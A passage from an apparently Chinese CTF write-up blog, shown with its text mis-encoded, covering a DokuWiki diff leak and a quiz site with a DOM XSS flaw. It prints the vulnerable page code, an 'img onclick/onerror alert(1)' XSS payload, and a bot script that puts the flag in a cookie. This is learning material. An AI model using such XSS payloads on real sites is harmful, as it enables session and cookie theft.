mpostæŒ‡å®šå…è®¸ç¼–è¯‘.mpæ–‡ä»¶</p><p>ä»¥ä¸Šå†…å®¹ä¸ºæ‰©å±•çŸ¥è¯†ï¼Œåªæ˜¯æƒ³è¯´ç›®å‰ç½‘é¡µä¸Šè¾“å…¥latexè¾“å‡ºPdfçš„ç½‘ç«™å…¶å®æ˜¯æœ‰é—®é¢˜çš„ã€‚</p><h2 id="Flagçš„ç—•è¿¹"><a href="#Flagçš„ç—•è¿¹" class="headerlink" title="Flagçš„ç—•è¿¹"></a>Flagçš„ç—•è¿¹</h2><blockquote><p>å° Z å¬è¯´ Dokuwiki é…ç½®å¾ˆç®€å•ï¼Œæ‰€ä»¥åœ¨è‡ªå·±çš„æœºå™¨ä¸Šæ•´äº†ä¸€ä»½ã€‚å¯æ˜¯ä¸å·§çš„æ˜¯ï¼Œä»–ä¸€ä¸å°å¿ƒæŠŠçè´µçš„ flag ç²˜è´´åˆ°äº† wiki é¦–é¡µæäº¤äº†ï¼ä»–èµ¶ç´§æ”¹å¥½ï¼Œå¹¶ä¸”ä¹ŸæŠŠå†å²è®°å½•ï¼ˆrevisionsï¼‰åŠŸèƒ½å…³æ‰äº†ã€‚</p></blockquote><blockquote><p>ã€Œè¿™æ ·å°±åº”è¯¥å°±ä¸ä¼šæ³„æ¼ flag äº†å§ã€ï¼Œå° Z å¦‚æ˜¯å®‰æ…°è‡ªå·±ã€‚</p></blockquote><blockquote><p>ç„¶è€Œäº‹å®çœŸçš„å¦‚æ­¤å—ï¼Ÿ</p></blockquote><blockquote><p>ï¼ˆé¢˜ç›® Dokuwiki ç‰ˆæœ¬åŸºäº 2022-07-31a â€œIgorâ€ï¼‰</p></blockquote><p>å‚è€ƒ<a href="https://www.dokuwiki.org/zh:recent_changes">https://www.dokuwiki.org/zh:recent_changes</a></p><ul><li>DokuWikiä¼šåˆ©ç”¨ä¸€ä¸ªç‰¹åˆ«é¡µé¢æ˜¾ç¤ºwikiä¸­æœ€è¿‘è¢«ä¿®æ”¹çš„é¡µé¢ã€‚æ‰€æœ‰è¢«ä¿®æ”¹é¡µé¢éƒ½ä¼šåœ¨â€recentâ€ä¸­åˆ—å‡ºã€‚åŒ…æ‹¬ä¿®æ”¹æ—¶é—´ã€ä¿®æ”¹è€…å’Œä¿®æ”¹ä¿¡æ¯ã€‚ä¸”åŒæ—¶æä¾›æ¯ä¸ªé¡µé¢çš„é¡µé¢æ¯”è¾ƒ</li><li>?do&#x3D;recentå°±å¯ä»¥æ˜¾ç¤ºä»æ›´æ”¹æ—¥å¿—è¯»å–çš„ä¿¡æ¯</li></ul><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221101170627291.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221101170627291.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>ä½†æ˜¯å¾ˆæ˜¾ç„¶æ²¡é‚£ä¹ˆç®€å•ï¼Œæ›´æ”¹æ—¥å¿—ä»¥åŠè¢«ç®¡ç†å‘˜åšæ‰äº†ã€‚</p><p>çœ‹WPçš„æ—¶å€™ï¼Œå¤§ä½¬å¤ªå¤šäº†ï¼Œå‚è€ƒé“¾æ¥ï¼š<code>https://github.com/splitbrain/dokuwiki/issues/3576</code></p><p>DokuWikiæœ‰å·®å¼‚æŸ¥çœ‹å™¨diffç”¨ä»¥æŸ¥çœ‹æ–‡æ¡£çš„æ›´æ”¹ï¼Œå¼•æ“ä»£ç æ¥è‡ªMediaWikiï¼ˆå¦‚æœæœ‰å¤§ä½¬ç ”ç©¶çš„è¯ï¼‰ï¼Œdiffç”šè‡³å¯ä»¥ç”¨æ¥ä»£æ›¿wgetå’Œtarä¸€æ­¥åˆ°ä½æ‰“è¡¥ä¸</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221101172219194.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221101172219194.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221101172255938.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221101172255938.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><h2 id="å¾®ç§¯åˆ†è®¡ç®—å°ç»ƒä¹ "><a href="#å¾®ç§¯åˆ†è®¡ç®—å°ç»ƒä¹ " class="headerlink" title="å¾®ç§¯åˆ†è®¡ç®—å°ç»ƒä¹ "></a>å¾®ç§¯åˆ†è®¡ç®—å°ç»ƒä¹ </h2><blockquote><p>å° X ä½œä¸ºæŸé—¨ç¬¦å·è®¡ç®—è¯¾ç¨‹çš„åŠ©æ•™ï¼Œä¸ºäº†è®©å¤§å®¶ç†Ÿæ‚‰è½¯ä»¶çš„ä½¿ç”¨ï¼Œä»–å†™äº†ä¸€ä¸ªå°ç½‘ç«™ï¼šä¸Šé¢æ”¾ç€äº”é“ç®€å•çš„é¢˜ç›®ï¼Œåªè¦è¾“å…¥å§“åå’Œé¢˜ç›®ç­”æ¡ˆï¼Œæäº¤åå°±å¯ä»¥çœ‹åˆ°è‡ªå·±çš„åˆ†æ•°ã€‚</p><p><a href="http://202.38.93.111:10056/?token=3769:MEUCIQDxxj46AjSZ8APu8g0Zo54tLjaUKvcCSoal/zOg5Q5+RQIgRZkzgB3uoXTiRJiOklEO0h1xyIFG50Qnn6s4WwNfcY8="></a></p></blockquote><blockquote><p>æƒ³èµ·è‡ªå·±å‰å‡ å¤©åœ¨å…¬ä¼—å·ä¸Šå­¦è¿‡çš„ Java è®¾è®¡æ¨¡å¼å…è´¹è¯•å¬è¯¾ï¼Œæœ¬ç€å‰åç«¯ç¦»å¿ƒï¼ˆå’¦ï¼Ÿæ˜¯å‰åç«¯ç¦»å¿ƒå—ï¼Ÿè¿˜æ˜¯ç¦»å©šï¼Ÿç¦»ã€‚ã€‚ç¦»è°±ï¼Ÿæ€»ä¹‹æŠŠåŠŸèƒ½èƒ½æ‹†åˆ™æ‹†å°±å¯¹å•¦ï¼‰çš„æ€æƒ³ï¼Œå° X è¿˜å•ç‹¬å†™äº†ä¸€ä¸ªç¨‹åºï¼Œæ¬¢è¿åŒå­¦ä»¬æŠŠè‡ªå·±çš„æˆç»©é“¾æ¥æäº¤ä¸Šæ¥ã€‚</p><p>æ€»ä¹‹ï¼Œå› ä¸ºå…¶å…ˆè¿›çš„è®¾è®¡æ€æƒ³ï¼Œéœ€è¦åŒå­¦ä»¬åšå®Œç»ƒä¹ ä¹‹åæ‰‹åŠ¨æŠŠæˆç»©è¿æ¥è´´åˆ°è¿™é‡Œæ¥ï¼š</p><p><a href="http://202.38.93.111:10057/?token=3769:MEUCIQDxxj46AjSZ8APu8g0Zo54tLjaUKvcCSoal/zOg5Q5+RQIgRZkzgB3uoXTiRJiOklEO0h1xyIFG50Qnn6s4WwNfcY8="></a></p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221101174652809.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221101174652809.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p></blockquote><p>1.sagemathï¼ˆroundä¿ç•™ä¸€ä½å°æ•°ï¼‰</p><ul><li>å®šç§¯åˆ†å‡½æ•°ï¼šdefinite_integral(å‡½æ•°,å˜é‡,ä¸‹ç•Œ,ä¸Šç•Œ)  æ— ç©·ç”¨ooè¡¨ç¤º</li></ul><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221104091434552.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221104091434552.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>â€‹</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221104092025214.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221104092025214.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221104092126911.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221104092126911.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><ul><li><p>æ±‚æé™ï¼šlim(å‡½æ•°ï¼Œè‡ªå˜é‡æé™)</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221104091754449.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221104091754449.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p></li><li><p>æ±‚å¯¼ï¼šderivative(å‡½æ•°,è‡ªå˜é‡)(è‡ªå˜é‡å€¼)</p></li></ul><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221104092218446.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221104092218446.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>æ‰€ä»¥ç­”æ¡ˆæ˜¯ï¼š</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221104092922320.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221104092922320.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><a href="http://202.38.93.111:10056/share?result=MTAwOjExMjMxMg==#">http://202.38.93.111:10056/share?result=MTAwOjExMjMxMg%3D%3D#</a></p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221104094512355.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221104094512355.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221104094528706.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221104094528706.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>è™½ç„¶æ˜¯å¯¹çš„ï¼Œä½†æ˜¯ä¸ç»™flagï¼Œå˜»å˜»</p><p>2.XSS</p><p>éšä¾¿å¡«ï¼Œæäº¤åä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">href</span>=<span class="string">&quot;/static/bootstrap/css/bootstrap.min.css&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>å¾® ç§¯ åˆ† è®¡ ç®— å° ç»ƒ ä¹ <span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;container px-3 py-3&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h1</span>&gt;</span>ç»ƒä¹ æˆç»©é¡µé¢<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">p</span> <span class="attr">id</span>=<span class="string">&quot;greeting&quot;</span>&gt;</span>æ‚¨å¥½ï¼Œ[[ username ]]ï¼<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">p</span> <span class="attr">id</span>=<span class="string">&quot;score&quot;</span>&gt;</span>æ‚¨åœ¨ç»ƒä¹ ä¸­è·å¾—çš„åˆ†æ•°ä¸º <span class="tag">&lt;<span class="name">b</span>&gt;</span>[[ score ]]<span class="tag">&lt;/<span class="name">b</span>&gt;</span>/100ã€‚<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;#&quot;</span> <span class="attr">id</span>=<span class="string">&quot;copy&quot;</span>&gt;</span>ç‚¹å‡»æ­¤é“¾æ¥ï¼Œå°†é¡µé¢ URL å¤åˆ¶åˆ°å‰ªè´´æ¿ã€‚<span class="tag">&lt;/<span class="name">a</span>&gt;</span>ä½ å¯è¿”å›å¹³å°ï¼Œåœ¨ã€Œæäº¤ç»ƒä¹ æˆç»© URLã€å¤„æäº¤è¿™é‡Œå¤åˆ¶çš„ URLã€‚<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;/&quot;</span>&gt;</span>å†è¯•ä¸€æ¬¡<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">function</span> <span class="title function_">click</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">var</span> url = <span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span>;</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">var</span> input = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;input&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">            input.<span class="title function_">setAttribute</span>(<span class="string">&#x27;readonly&#x27;</span>, <span class="string">&#x27;readonly&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">            input.<span class="title function_">setAttribute</span>(<span class="string">&#x27;value&#x27;</span>, url);</span></span><br><span class="line"><span class="language-javascript">            <span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">appendChild</span>(input);</span></span><br><span class="line"><span class="language-javascript">            input.<span class="title function_">select</span>();</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">if</span> (<span class="variable language_">document</span>.<span class="title function_">execCommand</span>(<span class="string">&#x27;copy&#x27;</span>)) &#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="variable language_">document</span>.<span class="title function_">execCommand</span>(<span class="string">&#x27;copy&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">                <span class="title function_">alert</span>(<span class="string">&#x27;å·²å¤åˆ¶åˆ°å‰ªè´´æ¿&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">            &#125;</span></span><br><span class="line"><span class="language-javascript">            <span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">removeChild</span>(input);</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">        </span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&quot;#copy&quot;</span>).<span class="title function_">addEventListener</span>(<span class="string">&quot;click&quot;</span>, click);</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">const</span> queryString = <span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">search</span>;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">const</span> urlParams = <span class="keyword">new</span> <span class="title class_">URLSearchParams</span>(queryString);</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">const</span> result = urlParams.<span class="title function_">get</span>(<span class="string">&#x27;result&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">const</span> b64decode = <span class="title function_">atob</span>(result);</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">const</span> colon = b64decode.<span class="title function_">indexOf</span>(<span class="string">&quot;:&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">const</span> score = b64decode.<span class="title function_">substring</span>(<span class="number">0</span>, colon);</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">const</span> username = b64decode.<span class="title function_">substring</span>(colon + <span class="number">1</span>);</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&quot;#greeting&quot;</span>).<span class="property">innerHTML</span> = <span class="string">&quot;æ‚¨å¥½ï¼Œ&quot;</span> + username + <span class="string">&quot;ï¼&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&quot;#score&quot;</span>).<span class="property">innerHTML</span> = <span class="string">&quot;æ‚¨åœ¨ç»ƒä¹ ä¸­è·å¾—çš„åˆ†æ•°ä¸º &lt;b&gt;&quot;</span> + score + <span class="string">&quot;&lt;/b&gt;/100ã€‚&quot;</span>;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>å…ˆåˆ†æclickï¼Œwindow.location.herfä¸ºå½“å‰æ‰“å¼€é¡µé¢ï¼Œdocument.createElementä¸ºåˆ›å»ºinputçš„HTMLæ ‡ç­¾ã€‚input.setAttributeå‘inputæ ‡ç­¾å¡«å±æ€§ï¼Œå’Œvalueä¸åŒçš„æ˜¯setAttributeä¼šç›´æ¥å‘inputæ·»åŠ å±æ€§è€Œä¸æ˜¯åªæ”¹å˜è¾“å…¥æ¡†çš„å†…å®¹ã€‚document.body.appendChildæŠŠinputè¿½åŠ åˆ°bodyéƒ¨åˆ†ã€‚document.execCommand()æŒ‡ç‚¹å‡»é“¾æ¥æ—¶æŠŠurl copyåˆ°å‰ªåˆ‡æ¿ã€‚æ‰€ä»¥clickçš„ä½œç”¨å°±æ˜¯</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221104204609164.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221104204609164.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>ç‚¹å‡»æ­¤é“¾æ¥ï¼Œå¤åˆ¶åˆ°å‰ªåˆ‡æ¿</p><p>é‡ç‚¹åœ¨äºåé¢å®šä¹‰çš„å‡ ä¸ªå¸¸é‡ã€‚åœ¨é¡µé¢ä¸Šæ˜¾ç¤ºçš„â€æ‚¨å¥½ï¼Œ1â€å’Œåˆ†æ•°éƒ½åœ¨innerHTMLå†…ï¼Œä½†äº‹å®ä¸ŠinnerHTMLå…·æœ‰å¾ˆå¤§çš„æ¼æ´ã€‚innerHTMLè™½ç„¶ä¸æ‰§è¡Œ&lt;script&gt;æ ‡ç­¾ï¼Œä½†æ˜¯XSSäº‹ä»¶æ˜¯ä¸éœ€è¦scriptæ ‡ç­¾è¿›è¡ŒXSSçš„ã€‚</p><p>windows.location.searchè·å–urlå­—ç¬¦ä¸²ï¼Œç»è¿‡URLSearchParamsè§£æåç”¨atobè§£ç base64,ç„¶å:ç­¾åä¸ºåˆ†æ•°åé¢ä¸ºç”¨æˆ·åã€‚</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221104210001641.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221104210001641.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221104205941206.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221104205941206.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><code>&lt;img src=a onclick=&quot;alert(1)&quot;&gt;</code> base64åä¼ å…¥resultï¼Œç‚¹å‡»å›¾ç‰‡å¤„å‘ç”Ÿå¼¹çª—</p><p>ä½†æ˜¯ä¸æ–¹ä¾¿ï¼Œç”¨onerrorï¼Œå›¾ç‰‡herfä¹±å†™æ˜¯ä¸€å®šä¼šåŠ è½½é”™è¯¯çš„ã€‚</p><p>åœ¨bot.pyé‡Œç»™å‡ºäº†æäº¤é“¾æ¥çš„æºç ï¼š</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"><span class="keyword">import</span> selenium</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="comment"># secret.py will NOT be revealed to players</span></span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> FLAG, BOT_SECRET</span><br><span class="line"></span><br><span class="line">LOGIN_URL = <span class="string">f&#x27;http://web/?bot=<span class="subst">&#123;BOT_SECRET&#125;</span>&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Please submit your quiz URL:&#x27;</span>)</span><br><span class="line">url = <span class="built_in">input</span>(<span class="string">&#x27;&gt; &#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># URL replacement</span></span><br><span class="line"><span class="comment"># In our environment bot access http://web</span></span><br><span class="line"><span class="comment"># If you need to test it yourself locally you should adjust LOGIN_URL and remove the URL replacement source code</span></span><br><span class="line"><span class="comment"># and write your own logic to use your own token to &quot;login&quot; with headless browser</span></span><br><span class="line">parsed = urllib.parse.urlparse(url)</span><br><span class="line">parsed = parsed._replace(netloc=<span class="string">&quot;web&quot;</span>, scheme=<span class="string">&quot;http&quot;</span>)</span><br><span class="line">url = urllib.parse.urlunparse(parsed)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Your URL converted to <span class="subst">&#123;url&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    options = webdriver.ChromeOptions()</span><br><span class="line">    options.add_argument(<span class="string">&#x27;--no-sandbox&#x27;</span>) <span class="comment"># sandbox not working in docker</span></span><br><span class="line">    options.add_argument(<span class="string">&#x27;--headless&#x27;</span>)</span><br><span class="line">    options.add_argument(<span class="string">&#x27;--disable-gpu&#x27;</span>)</span><br><span class="line">    options.add_argument(<span class="string">&#x27;--user-data-dir=/dev/shm/user-data&#x27;</span>)</span><br><span class="line">    os.environ[<span class="string">&#x27;TMPDIR&#x27;</span>] = <span class="string">&quot;/dev/shm/&quot;</span></span><br><span class="line">    options.add_experimental_option(<span class="string">&#x27;excludeSwitches&#x27;</span>, [<span class="string">&#x27;enable-logging&#x27;</span>])</span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> webdriver.Chrome(options=options) <span class="keyword">as</span> driver:</span><br><span class="line">        ua = driver.execute_script(<span class="string">&#x27;return navigator.userAgent&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27; I am using&#x27;</span>, ua)</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;- Logining...&#x27;</span>)</span><br><span class="line">        driver.get(LOGIN_URL)</span><br><span class="line">        time.sleep(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27; Putting secret flag...&#x27;</span>)</span><br><span class="line">        driver.execute_script(<span class="string">f&#x27;document.cookie=&quot;flag=<span class="subst">&#123;FLAG&#125;</span>&quot;&#x27;</span>)</span><br><span class="line">        time.sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;- Now browsing your quiz result...&#x27;</span>)</span><br><span class="line">        driver.get(url)</span><br><span class="line">        time.sleep(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            greeting = driver.execute_script(<span class="string">f&quot;return document.querySelector(&#x27;#greeting&#x27;).textContent&quot;</span>)</span><br><span class="line">            score = driver.execute_script(<span class="string">f&quot;return document.querySelector(&#x27;#score&#x27;).textContent&quot;</span>)</span><br><span class="line">        <span class="keyword">except</span> selenium.common.exceptions.JavascriptException:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;JavaScript Error: Did you give me correct URL?&#x27;</span>)</span><br><span class="line">            exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;OK. Now I know that:&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(greeting)</span><br><span class="line">        <span class="built_in">print</span>(score)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;- Thank you for joining my quiz!&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;ERROR&#x27;</span>, <span class="built_in">type</span>(e))</span><br><span class="line">    <span class="keyword">import</span> traceback</span><br><span class="line">    traceback.print_exception(*sys.exc_info(), limit=<span class="number">0</span>, file=<span class="literal">None</span>, chain=<span class="literal">False</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>å…¶ä¸­æœ€ä¸ºé‡è¦çš„æ˜¯ä¸‰ä¸ªdriver.execute_scriptæ‰§è¡ŒJSä»£ç 